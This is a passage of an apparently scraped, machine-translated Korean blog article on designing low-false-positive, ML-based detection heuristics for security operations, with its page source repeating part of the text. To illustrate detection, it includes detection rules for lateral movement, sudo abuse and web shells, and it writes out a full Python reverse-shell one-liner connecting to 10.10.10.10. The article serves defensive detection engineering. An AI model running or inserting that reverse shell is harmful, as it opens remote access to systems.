분석가들의 대시보드가 크리스마스 트리처럼 빛나게 되고, 상기 그림 1을 고려하세요; (2) 분석가들이 경보 피로를 느끼게 됩니다; (3) 머신 러닝 휴리스틱이 비활성화되거나 무시됩니다.\n\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 일반적 vs. 특정 휴리스틱\n\n먼저 좁은 지능과 일반적 지능의 개념에 주의를 기울이고 싶습니다. 이는 직접적으로 보안 휴리스틱에 옮겨집니다.\n\n일반적으로, 지능은 목표를 달성하는 능력입니다. 우리는 \"일반화\"하고, 달성해야 할 목표에 도달하기 위해 자연선택과 유전적 인섈트에 의해 주도되는 환경에서는 결코 필요하지 않은 목표를 달성할 수 있는 능력을 갖고 있다고 여겨집니다.\n\n일반화가 우리 종족이 세계를 정복할 수 있게 해 줬지만, 일련의 작업에서 우리보다 훨씬 뛰어난 존재들이 있습니다. 예를 들어, 계산기는 폰 노이만 같은 우리보다 똑똑한 사람이 할 수 있는 산술보다 훨씬 더 잘 할 수 있으며, 다람쥐들 (!)은 작년에 숨겨둔 도토리의 위치를 기억하는 데 사람보다 훨씬 뛰어날 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\n![Architecture of AI-Driven Security Operations with a Low False Positive Rate](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_1.png)\n\n보안 휴리스틱에 대해 이야기할 수 있습니다. 특정 도구나 CVE에 중점을 둔 규칙들과 더 넓은 기법 집합을 감지하려는 규칙들이 있습니다. 예를 들어, CVE-2019–14287을 악용한 sudo 권한 상승에만 집중한 이 감지 로직을 살펴봅시다.\n\n```js\nCommandLine|contains: ' -u#'\n```\n\n반면에, 웹쉘 감지 규칙(가려진 형태로 복제됨)은 상당히 넓은 논리를 구현하려고 시도합니다.\n\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\nParentImage|endswith:\n - '/httpd'\n - '/nginx'\n - '/apache2'\n...\n\n\u0026\u0026\nImage|endswith:\n - '/whoami'\n - '/ifconfig'\n - '/netstat'\n\n\n보안 위협을 시각화하기 위해 감지 규칙을 공격적 기법, 도구 및 절차(TTP)의 랜드스케이프에 매핑하는 더 세밀한 행위 휴리스틱을 정의합니다. 위에 있는 인텔리전스 랜드스케이프와 유사하게, 다음과 같이 선언 규칙을 공격적 기법, 도구 및 절차(TTPs)의 랜드스케이프에 매핑하여 보안 포지션을 시각화할 수 있습니다:\n\n\u003cimg src=\"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_2.png\" /\u003e\n\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# False-Positives vs. False-Negatives\n\n슈도 CVE 규칙은 특정 기술 하나만 감지하고 다른 것을 놓치므로 (극히 높은 거짓 부정률) 거짓 음성 비율이 매우 높습니다. 반면에 웹 쉘 규칙은 Kali Linux 아카이브의 공격 기술 및 웹 쉘 도구 세트를 감지할 수 있습니다.\n\n명백한 질문은 - 그렇다면, 왜 우리는 여러 넓은 행동 규칙으로 모든 가능한 TTP를 다루지 않는 것일까요?\n\n왜냐하면 그것들은 거짓 양성을 가져오기 때문입니다... 정말 많이요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n여기서는 잘못된 긍정 대 잘못된 부정의 트레이드 오프를 관찰합니다.\n\n대부분의 기관은 sudo CVE 규칙을 복사하여 SIEM에서 즉시 활성화할 수 있지만, 웹쉘 규칙은 보안 분석가가 환경에서 관찰된 모든 합법적인 트리거를 걸러내는 동안 \"모니터 전용\" 모드로 작동할 수 있습니다.\n\n시스템 관리자가 생성한 자동화 알림을 볼 수 있습니다. 이 알림은 REST API 요청을 실행하고 열거 액션 중 하나를 트리거하는지 또는 배포될 때 이상한 부모-자식 프로세스 관계를 만드는 Ansible 셸 스크립트를 실행합니다. 결국 광범위한 행동 규칙이 열 두 가지 제외와 한 달에 두 번 이상의 수정을 통해 목록으로 전환되는 것을 관찰했습니다. 그래서 보안 엔지니어는 규칙의 범위 사이에서 균형을 유지합니다. 일반화의 확대는 비용이 많이든다는 것과 잘못된 긍정의 비율을 최소화하려고 노력합니다.\n\n# 보안 휴리스틱으로서의 기계 학습 실패\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n여기 보안 전문가들이 행동 휴리스틱을 구현하는 대체 기술을 찾기 시작합니다. 머신러닝 구현의 요구 사항은 선행적으로 넓습니다. 머신러닝 알고리즘의 적용 가능성을 고려할 때 대부분의 경우 보안 전문가들의 직관은 비지도 학습으로 이끕니다. 우리는 AI에게 네트워크에서 이상을 감지하고, 이상한 명령 라인에 대해 경고하는 등의 작업을 요청합니다. 이러한 작업은 \"나를 위해 보안을 해결해줘\"라는 일반화 수준에 있습니다. 생산에서 잘 작동하지 않는 것이 놀라운 부분입니다.\n\n실제로 많은 경우 ML은 정확히 우리가 요청한 대로 수행합니다. 예를 들어 IntelliJ가 자신을 업데이트하는 데 사용하는 이상한 elevator.exe 이진 파일을 보고할 수도 있으며, Spotify가 업데이트를 위해 사용하는 새로운 CDN에 대한 경고 또한 동일하게 Command and Control 콜백과 똑같이 랜덤하게 지연될 수 있습니다. 그리고 그 날에 이상했던 수백 가지 유사한 행동들.\n\n감독 학습의 경우에는 대규모의 레이블이 지정된 데이터 집합을 구성할 수 있는 경우(예: 악성 코드 탐지), EMBER와 같이 일반화가 잘 되는 모델링 체계를 구축할 수 있습니다.\n\n그러나 이러한 솔루션들에서도 — 정보 보안의 현대적인 AI 모델조차 아직 \"회색\" 영역을 파악하기에 충분한 컨텍스트를 보유하고 있지 않습니다. 예를 들어, TeamViewer를 나쁜 것인지 좋은 것인지 고려해야 하는가? 많은 중소기업이 저렴한 VPN으로 사용하고 있습니다. 동시에 이러한 소규모 기업 중 일부는 이러한 도구를 사용하여 대상 네트워크에 백도어로 접근하는 랜섬웨어 그룹일 수도 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 머신 러닝이 보안 휴리스틱으로 성공한 사례\n\nML 기반 휴리스틱은 rule-based detection과 같은 이념을 따라야 합니다. 악의적인 TTP 집합에 초점을 맞추어야 합니다. 보안에 AI를 적용하려면 실제로 보안에 대한 지식과 직관이 필요하며, 데이터 과학자분들께 죄송하지만요. ¯\\_(ツ)_/¯ 적어도 오늘날에는 LLM이 다른 많은 작업에 이어 해결할 수 있는 폭넓은 일반화를 달성할 때까지 보안 문제를 해결할 수 있습니다.\n\n예를 들어, 명령줄에서 이상을 요청하는 대신 (이에 관한 결과가 이 글의 상단 그림 1에 표시된 것처럼 겸손한 크기의 데이터셋에서 634개의 이상으로 나타나는 것), 특정 공격 기법 주변의 베이스라인을 벗어난 활동을 요청해보세요. 즉, 이상한 Python 실행 (T1059.006)을 요청하고 바로 알아내세요! – 동일한 ML 알고리즘, 전처리 및 모델링 기술에 따르면, 실제로 Python 반전 셸인 유일한 이상을 발견할 수 있습니다:\n\n![image](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_3.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nUnix에 중점을 둔 비지도 학습 기법 예시:\n\n- 이상한 python/perl/ruby 프로세스 (스크립팅 인터프리터를 통한 실행, T1059.006);\n- 이상한 systemd 명령어 (systemd 프로세스를 통한 영속성, T1543.002);\n- 고 심각도 점프박스로의 이상한 ssh 로그인 출처 (T1021.004).\n\nWindows에 중점을 둔 비지도 학습 기법 예시:\n\n- 도메인 컨트롤러, MSSQL 서버에 로그인한 사용자의 이상 (T1021.002);\n- NTDLL.DLL을 로드하는 이상한 프로세스 (T1129);\n- 이상한 RDP 클라이언트 및 서버 조합과의 네트워크 연결 (T1021.001).\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n기능적인 지도 학습 기준 예시:\n\n- Reverse shell 모델: 알려진 방법을 활용하여 데이터셋의 악성 부분을 생성하십시오 (이와 같은 생성기에서 영감을 받으세요); 환경 텔레메트리에서 프로세스 생성 이벤트를 사용하여 데이터셋의 합법적인 대응물로 활용하십시오.\n- 강력한 속임수에 대한 규칙을 머릿속에 만드는 대신, 아래의 그림 5에 나온 것과 같이 속임수에 대한 견고성을 고려한 별도의 기계 학습 모델을 구축하십시오 (스포일러: 성공할 수 없습니다). Mandiant의 이 주제에 대한 좋은 기사가 있습니다.\n\n![이미지](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_4.png)\n\n# 기계 학습은 서명 논리의 확장입니다\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n위의 예시들을 체계적으로 정리하면, ML 휴리스틱을 성공적으로 적용하는 데에는 다음 두 단계가 포함됩니다:\n\n- 특정 TTP에서 생성된 텔레메트리를 가능한 정확하게 포착할 수 있도록 입력 데이터를 좁힌 후;\n- 비정상 활동을 찾기 위해 가능한 한 적은 차원을 정의합니다 (예: 프로세스 이미지만 볼 수 있는 논리는 부모 프로세스 이미지와 프로세스 인수를 추가로 볼 때보다 경보를 적게 발생시킵니다).\n\n위의 단계 1은 사실 시그니처 규칙을 생성하는 방법입니다.\n\n웹 셸 규칙을 활성화하기 전 \"보안 분석가들이 환경을 대표하는 모든 트리거를 걸러낸다\"고 이전에 얘기한 것을 기억하나요? 이것이 단계 2입니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n과거 사례에서 어떤 사람이 정당한 활동과 악의적인 활동 사이의 의사 결정 경계를 구축합니다. 사실 현대 ML 알고리즘은 여기에 정말 강합니다. ML 휴리스틱은 특정 TTP 주변의 대규모 정당한 활동을 수동으로 걸러내는 부담을 줄일 수 있습니다. 따라서 ML은 더 많은 작업 없이 시그니처 규칙보다 넓은 휴리스틱을 구축할 수 있게 합니다.\n\n# 스위스 치즈 모델\n\n이제 우리는 종합적인 비전을 개요로 설명할 준비가 되었습니다.\n\n전통적인 탐지 엔지니어링 접근 방식은 SOC 대시보드가 넘치지 않도록 가능한 많은 시그니처 규칙을 쌓는 것입니다. 이러한 각 규칙은 높은 거짓 부정률 (FNR)을 가지지만 낮은 거짓 양성률 (FPR)을 가집니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n우리는 ML 휴리스틱을 계속 쌓아갈 수 있습니다. 이때 FPR에 대한 요구 사항은 낮아야 합니다. 왜냐하면 유일한 병목 현상을 보호해야 하기 때문입니다: 인간 분석가의 주의력입니다. ML 휴리스틱은 보안 엔지니어의 시간 자원을 크게 고갈시키지 않고 더 일반적인 행동 논리를 도입함으로써 규칙 기반 감지의 틈을 메울 수 있습니다.\n\n만약 대부분의 낮은 hanging fruits를 다루었고 행동 분석에 더 깊게 집중하고 싶다면, 현재 활용 중인 것 위에 딥 러닝 논리를 추가할 수 있습니다.\n\n![ML heuristics](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_5.png)\n\nOccam의 면도날 원리를 기억하고, 가능한 간단하게 모든 새로운 휴리스틱을 구현하세요. 신호 규칙이 신뢰할 수 있는 기준선을 정의할 수 없는 경우에만 ML을 사용하십시오.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n예를 들어, 이전에 언급한 이상한 Python 실행과 관련해 — Python 아규먼트는 여전히 환경 내에서 너무 다양할 수 있어서 너무 많은 이상 활동에 대한 경고를 받을 수 있습니다. 더 좁혀서 특정해야 할 수도 있습니다. 예를 들어, 명령줄에 -c가 포함된 프로세스만 캡처하여 Python 바이너리에 인수로 전달된 코드를 찾는 경우에 사용할 수 있습니다. 따라서, 이러한 Python 역술술에만 집중하는 방법을 고려해볼 수 있습니다:\n\n```js\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'\n```\n\nFPR을 감소시키면 False-Negative가 증가합니다. 따라서, 특이한 이름을 가진 스크립트로부터 Python 실행을 놓칠 수 있습니다. 예를 들어, python fake_server.py와 같이 사용자가 도용한 가짜 서비스를 사용하는 공격자들이 사용할 수 있는 스크립트입니다. 이를 위해 이러한 TTP들의 하위 집합에 중점을 둔 FPR이 낮은 별도의 휴리스틱을 만들어보는 것이 좋을 수 있습니다.\n\n# 메타-감지 계층\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n스위스 치즈 방법론을 따라도 상세한 휴리스틱을 얻게 됩니다. 보통 이러한 것들은 악의적인 의도를 나타내는 것은 아니지만 맥락에 관심이 있는 것입니다.\n\n예를 들어, 새 소스에서 고심도 호스트로 SSH/RDP 로그인하는 것은 나쁜 것이 아닙니다(그냥 새 직원이나 워크스테이션일 수 있습니다), 또한 skilled 사용자 중에 whoami /all 실행이 일반적일 수 있습니다. 따라서 이러한 휴리스틱 모두 경보를 직접 트리거하기에 적합하지 않습니다. 그러나 두 가지의 조합은 분석가의 주의를 끌 수 있을지도 모릅니다.\n\n이 딜레마의 해결책은 \"True Positive Benigns\"를 생성하는 이러한 상세한 규칙 위에 추가적인 논리를 도입하는 것입니다. 우리는 이것을 메타-감지 계층이라고 부를 수 있습니다.\n\n![아키텍처](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_6.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n룰 활성화 위에 적용되는 메타로직은 다양할 수 있지만 일반적으로 두 단계로 이뤄집니다:\n\n- \"그룹화\": 모든 활성화를 \"엔티티\"별(예: 호스트, 사용자 이름, 소스 IP, 쿠키 등)로 그룹화합니다.\n- 일정 기간 내의 활성화에 대한 \"집계 함수\"를 적용합니다.\n\n간단하면서도 기능적인 메타 탐지 로직의 예시:\n\n- 단일 엔티티(호스트 또는 사용자와 같은)에서 다른 룰 트리거의 수를 카운트하고, 세 시간 내에 세 가지 이상의 다른 룰이 트리거되면 보고합니다.\n- 위와 동일하나, 심각성을 기준으로 룰에 가중치를 부여하고, \"중요\" 룰은 3으로, \"중간\"은 2로, \"정보\"는 1로 취급하여 임계값을 초과할 경우 보고합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n더 정교한 방법들이 존재하는데, 저는 악성 코드 표현에 ML의 두 번째 층을 사용하는 AISec ’22 논문에 정의된 방법을 사용하고 있어요. 이들은 특정 어플리케이션과 환경에 튜닝되어야 해요. 왜냐하면 데이터 세부 정보, 텔레메트리 양 및 인프라 규모에 따라 다른 접근 방식이 필요해요. 이러한 접근 방식은 적절한 경고 한도를 유지하는 데 도움이 돼요.  \n\n# 결론  \n\n이 기사에서 우리는 시그니처 방식을 넘어서 보안 작업 무기함을 확장하는 사고 방식에 대해 논의했어요. 대부분의 구현은 보안 전문가들이 기계 학습(ML)을 통한 행동 휴리스틱에 너무 광범위한 요구 사항을 정의하기 때문에 제대로 수행하지 못했어요.  \n\n우리는 적절한 적용은 공격적인 기술, 전술 및 절차(TTPs)에 의해 이끌어져야 한다고 주장해요. 올바르게 사용될 때, ML 기술은 특정 TTP 주변의 합법적인 활동의 기준을 효율적으로 걸러내는 데 많은 인력을 절약할 수 있어요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n성숙하고 성공적인 보안 체계는 시그니처와 행동 휴리스틱이 결합된 것으로 구성됩니다. 각각의 별도 검출 논리는 낮은 거짓 긍정률을 갖추고, 거짓 부정을 놓치지 않기 위한 제한 사항은 병렬로 여러 휴리스틱을 적용함으로써 균형을 이룹니다.\n\n이 글에서 사용된 예시는 전통적인 보안 운영에 적용될 경우 감지 엔지니어링 사례를 포함하고 있습니다. 그러나 우리는 같은 방법론이 제한적인 수정을 통해 다른 보안 응용프로그램에서도 유용할 것이라 주장합니다. 예를 들어, EDR/XDR 휴리스틱 공간, 네트워크 트래픽 분석 및 계산 등이 있습니다.\n\n# 추가 정보\n\n## 기술 노트: 고정된 거짓 긍정률 하에서 검출률 추정\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n프로덕션 환경에서 행동 ML 휴리스틱 유틸리티를 평가하는 방법에 대한 코드 샘플이 포함된 공지입니다.\n\n데이터 과학자 여러분 — 정확도, F1-스코어 및 AUC와 같은 지표는 보안 솔루션의 프로덕션 준비 상태에 대해 거의 알려주지 않습니다. 이러한 메트릭은 여러 솔루션이 얼마나 유용한지를 추론하는 데 사용될 수 있지만 절대적인 값을 제공하지는 않습니다.\n\n보안 텔레메트리에서 발생하는 베이스 레이트 펄러시 때문에 이렇습니다 — 기본적으로 모델이 볼 수 있는 모든 데이터는 양성 샘플들입니다 (양성 샘플이 아닌 경우를 실제로 가리킴). 따라서 심지어 0.001%의 가짜 양성률이 있더라도 휴리스틱이 매일 10,000개의 확인을 수행한다면 하루에 10건의 경보를 생성할 것입니다.\n\n모델의 유일한 실제 가치는 고정된 가짜 양성률(FPR) 하에서의 탐지율(즉, 실제 양성률, TPR)을 살펴보는 것으로 추정됩니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n아래 도표를 살펴봐주세요 — x축은 데이터 샘플의 실제 레이블을 나타냅니다. 이는 악성 또는 양성일 수 있습니다. y축에는 모델의 확률적 예측이 표시됩니다 — 샘플이 얼마나 나쁜 것으로 생각하는지입니다:\n\n![Plot](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_7.png)\n\n만약 단 하나의 잘못된 경고만 허용된다면, 모델의 결정 임계값을 약 ~0.75(파선이 그어진 빨간 선)로 설정해야 합니다. 두 번째 잘못된 긍정 값(위양성) 바로 위에 있습니다. 따라서 모델의 현실적인 감지율은 약 50%입니다 (점선이 상자그림의 평균값과 거의 일치합니다).\n\n변경 가능한 위양성율에 따른 감지율 평가는 아래의 코드 예시로 수행할 수 있습니다:\n\n```python\n# 코드 샘플\ndef evaluate_detection_rates(y_true, preds):\n    # 코드 구현 내용\n```","ogImage":{"url":"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png"},"coverImage":"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png","tag":["Tech"],"readingTime":11},"content":{"compiledSource":"/*@jsxRuntime automatic @jsxImportSource react*/\nconst {Fragment: _Fragment, jsx: _jsx, jsxs: _jsxs} = arguments[0];\nconst {useMDXComponents: _provideComponents} = arguments[0];\nfunction _createMdxContent(props) {\n  const _components = Object.assign({\n    h2: \"h2\",\n    p: \"p\",\n    img: \"img\",\n    ul: \"ul\",\n    li: \"li\",\n    h1: \"h1\",\n    pre: \"pre\",\n    code: \"code\",\n    span: \"span\"\n  }, _provideComponents(), props.components);\n  return _jsxs(_Fragment, {\n    children: [_jsx(_components.h2, {\n      children: \"이 기사는 사이버 보안에 적용된 제품 준비 단계의 기계 학습 솔루션 구축에 대한 마인드셋을 논의합니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: _jsx(_components.img, {\n        src: \"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png\",\n        alt: \"이미지\"\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"지난 몇 년간, 우리가 수십 년 동안 사용해온 교육 시스템의 품위를 훼손하는 LLMs가 존재하고, AGI로부터 실재적인 공포를 느끼기 시작했음에도 불구하고, 인공 지능(AI) 시스템을 새로운 데이터 과학 도메인에 적용하는 가능성은 먼산 미래적 이정표를 달성하기 어렵고 구별되는 접근이 필요합니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"이 기사에서는 사이버 보안에 대한 AI 적용 가능성, 대부분의 응용 프로그램이 실패하는 이유, 그리고 실제로 작동하는 방법론에 대해 개념적으로 논의합니다. 가정적으로, 제시된 접근 방식과 결론은 특히 시스템 로그로부터의 추론에 의존하는 낮은 잘못된 양성 요구 사항을 갖는 기타 응용 도메인으로 이전 가능합니다.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"정보 보안에 관련된 데이터에 머신 러닝(ML) 로직을 구현하는 방법은 다루지 않을 것입니다. 이미 다음 기사에서 코드 샘플과 함께 기능적인 구현 방법을 제공했습니다:\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"기업 보안 텔레미터의 Power Law 분포를 기반으로 한 이상 징후 탐지 엔지니어링;\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"리눅스 auditd 로그에서 TF-IDF 및 해시 인코딩으로 침입 탐지하는 셸 언어 처리;\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"시스템 로그에 대한 GPT와 유사한 모델 엔지니어링 기술 중 어떤 것이 작동하는가?\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"서명\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"아직도 성숙한 보안 자세의 근간이자 가장 가치 있는 구성 요소는 목표로 하는 시그니처 규칙뿐입니다. 아래에 예시로 나오는 휴리스틱은 우리 방어의 중요한 부분입니다:\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [\"parent_process == \", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"\\\"wmiprvse.exe\\\"\"\n        }), \"\\n\u0026\u0026 \\nprocess == \", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"\\\"cmd.exe\\\"\"\n        }), \"\\n\u0026\u0026 \\ncommand_includes (\\\\\\\\\", _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \"127.0\"\n        }), _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \".0\"\n        }), _jsx(_components.span, {\n          className: \"hljs-number\",\n          children: \".1\"\n        }), \"\\\\\", _jsx(_components.span, {\n          className: \"hljs-variable constant_\",\n          children: \"ADMIN\"\n        }), \")\\n\"]\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"정말이지, 이런 규칙들은 훌륭합니다. 이것은 레드 캐너리가 WMI를 통한 측면 이동 탐지를 위해 impacket과 같은 도구를 사용하여 실현할 수 있는 (간단화된) 논리의 예시일 뿐입니다. 이런 규칙을 절대 끄지 마시고 계속해서 추가해 나가세요!\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"하지만, 이 방법론에는 결함이 있습니다...\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"그래서 이러한 이유로 누구나 한번씩은 매직한 \\\"머신 러닝\\\"을 통해 보안 문제를 해결해 주는 솔루션에 자본, 인력, 시간 등의 자원을 투자하는 것입니다. 보통 이것은 투자 대비 수익이 낮은 토끼굴로 보입니다: (1) 보안 분석가들의 대시보드가 크리스마스 트리처럼 빛나게 되고, 상기 그림 1을 고려하세요; (2) 분석가들이 경보 피로를 느끼게 됩니다; (3) 머신 러닝 휴리스틱이 비활성화되거나 무시됩니다.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"일반적 vs. 특정 휴리스틱\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"먼저 좁은 지능과 일반적 지능의 개념에 주의를 기울이고 싶습니다. 이는 직접적으로 보안 휴리스틱에 옮겨집니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"일반적으로, 지능은 목표를 달성하는 능력입니다. 우리는 \\\"일반화\\\"하고, 달성해야 할 목표에 도달하기 위해 자연선택과 유전적 인섈트에 의해 주도되는 환경에서는 결코 필요하지 않은 목표를 달성할 수 있는 능력을 갖고 있다고 여겨집니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"일반화가 우리 종족이 세계를 정복할 수 있게 해 줬지만, 일련의 작업에서 우리보다 훨씬 뛰어난 존재들이 있습니다. 예를 들어, 계산기는 폰 노이만 같은 우리보다 똑똑한 사람이 할 수 있는 산술보다 훨씬 더 잘 할 수 있으며, 다람쥐들 (!)은 작년에 숨겨둔 도토리의 위치를 기억하는 데 사람보다 훨씬 뛰어날 수 있습니다.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: _jsx(_components.img, {\n        src: \"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_1.png\",\n        alt: \"Architecture of AI-Driven Security Operations with a Low False Positive Rate\"\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"보안 휴리스틱에 대해 이야기할 수 있습니다. 특정 도구나 CVE에 중점을 둔 규칙들과 더 넓은 기법 집합을 감지하려는 규칙들이 있습니다. 예를 들어, CVE-2019–14287을 악용한 sudo 권한 상승에만 집중한 이 감지 로직을 살펴봅시다.\"\n    }), \"\\n\", _jsx(_components.pre, {\n      children: _jsxs(_components.code, {\n        className: \"hljs language-js\",\n        children: [_jsx(_components.span, {\n          className: \"hljs-title class_\",\n          children: \"CommandLine\"\n        }), \"|\", _jsx(_components.span, {\n          className: \"hljs-attr\",\n          children: \"contains\"\n        }), \": \", _jsx(_components.span, {\n          className: \"hljs-string\",\n          children: \"' -u#'\"\n        }), \"\\n\"]\n      })\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"반면에, 웹쉘 감지 규칙(가려진 형태로 복제됨)은 상당히 넓은 논리를 구현하려고 시도합니다.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"ParentImage|endswith:\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"'/httpd'\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"'/nginx'\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"'/apache2'\\n...\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"\u0026\u0026\\nImage|endswith:\"\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: \"'/whoami'\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"'/ifconfig'\"\n      }), \"\\n\", _jsx(_components.li, {\n        children: \"'/netstat'\"\n      }), \"\\n\"]\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"보안 위협을 시각화하기 위해 감지 규칙을 공격적 기법, 도구 및 절차(TTP)의 랜드스케이프에 매핑하는 더 세밀한 행위 휴리스틱을 정의합니다. 위에 있는 인텔리전스 랜드스케이프와 유사하게, 다음과 같이 선언 규칙을 공격적 기법, 도구 및 절차(TTPs)의 랜드스케이프에 매핑하여 보안 포지션을 시각화할 수 있습니다:\"\n    }), \"\\n\", _jsx(\"img\", {\n      src: \"/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_2.png\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"False-Positives vs. False-Negatives\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"슈도 CVE 규칙은 특정 기술 하나만 감지하고 다른 것을 놓치므로 (극히 높은 거짓 부정률) 거짓 음성 비율이 매우 높습니다. 반면에 웹 쉘 규칙은 Kali Linux 아카이브의 공격 기술 및 웹 쉘 도구 세트를 감지할 수 있습니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"명백한 질문은 - 그렇다면, 왜 우리는 여러 넓은 행동 규칙으로 모든 가능한 TTP를 다루지 않는 것일까요?\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"왜냐하면 그것들은 거짓 양성을 가져오기 때문입니다... 정말 많이요.\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"여기서는 잘못된 긍정 대 잘못된 부정의 트레이드 오프를 관찰합니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"대부분의 기관은 sudo CVE 규칙을 복사하여 SIEM에서 즉시 활성화할 수 있지만, 웹쉘 규칙은 보안 분석가가 환경에서 관찰된 모든 합법적인 트리거를 걸러내는 동안 \\\"모니터 전용\\\" 모드로 작동할 수 있습니다.\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"시스템 관리자가 생성한 자동화 알림을 볼 수 있습니다. 이 알림은 REST API 요청을 실행하고 열거 액션 중 하나를 트리거하는지 또는 배포될 때 이상한 부모-자식 프로세스 관계를 만드는 Ansible 셸 스크립트를 실행합니다. 결국 광범위한 행동 규칙이 열 두 가지 제외와 한 달에 두 번 이상의 수정을 통해 목록으로 전환되는 것을 관찰했습니다. 그래서 보안 엔지니어는 규칙의 범위 사이에서 균형을 유지합니다. 일반화의 확대는 비용이 많이든다는 것과 잘못된 긍정의 비율을 최소화하려고 노력합니다.\"\n    }), \"\\n\", _jsx(_components.h1, {\n      children: \"보안 휴리스틱으로서의 기계 학습 실패\"\n    }), \"\\n\", _jsx(\"div\", {\n      class: \"content-ad\"\n    }), \"\\n\", _jsx(_components.p, {\n      children: \"여기 보안 전문가들이 행동 휴리스틱을 구현하는 대체 기술을 찾기 시작합니다. 머신러닝 구현의 요구 사항은 선행적으로 넓습니다. 머신러닝 알고리즘의 적용 가능성을 고려할 때 대부분의 경우 보안 전문가들의 직관은 비지도 학습으로 이끕니다. 우리는 AI에게 